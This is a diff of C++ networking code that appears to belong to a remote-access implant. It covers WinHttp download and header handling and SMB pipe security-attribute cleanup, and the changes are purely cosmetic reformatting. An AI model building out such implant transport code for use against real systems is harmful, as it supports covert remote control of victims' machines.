@@ -24,9 +24,10 @@ namespace Network {
 
                 x_memset(buffer, 0, length + 1);
                 x_assert(Ctx->win32.WinHttpReadData(request, buffer, length, R_CAST(LPDWORD, &read)));
-                x_memcpy(B_PTR(download) + total, buffer, read);
 
+                x_memcpy(B_PTR(download) + total, buffer, read);
                 ZeroFreePtr(buffer, read);
+
                 total += read;
 
             } while (length > 0);
@@ -195,6 +196,7 @@ namespace Network {
                     if (!(header = Ctx->transport.http->headers[n_headers])) {
                         break;
                     }
+
                     x_assert(Ctx->win32.WinHttpAddRequestHeaders(req_ctx.req_handle, header, -1, WINHTTP_ADDREQ_FLAG_ADD));
                     n_headers++;
                 }
@@ -220,20 +222,10 @@ namespace Network {
 
         VOID SmbContextDestroy(PSMB_PIPE_SEC_ATTR SmbSecAttr) {
 
-            if (SmbSecAttr->sid) {
-                Ctx->win32.FreeSid(SmbSecAttr->sid);
-                SmbSecAttr->sid = nullptr;
-            }
-            if (SmbSecAttr->sid_low) {
-                Ctx->win32.FreeSid(SmbSecAttr->sid_low);
-                SmbSecAttr->sid_low = nullptr;
-            }
-            if (SmbSecAttr->p_acl) {
-                x_free(SmbSecAttr->p_acl);
-            }
-            if (SmbSecAttr->sec_desc) {
-                x_free(SmbSecAttr->sec_desc);
-            }
+            if (SmbSecAttr->sid)        { Ctx->win32.FreeSid(SmbSecAttr->sid); SmbSecAttr->sid = nullptr; }
+            if (SmbSecAttr->sid_low)    { Ctx->win32.FreeSid(SmbSecAttr->sid_low); SmbSecAttr->sid_low = nullptr; }
+            if (SmbSecAttr->p_acl)      { x_free(SmbSecAttr->p_acl); }
+            if (SmbSecAttr->sec_desc)   { x_free(SmbSecAttr->sec_desc); }
         }
 
         VOID SmbContextInit(SMB_PIPE_SEC_ATTR *const SmbSecAttr, PSECURITY_ATTRIBUTES SecAttr) {
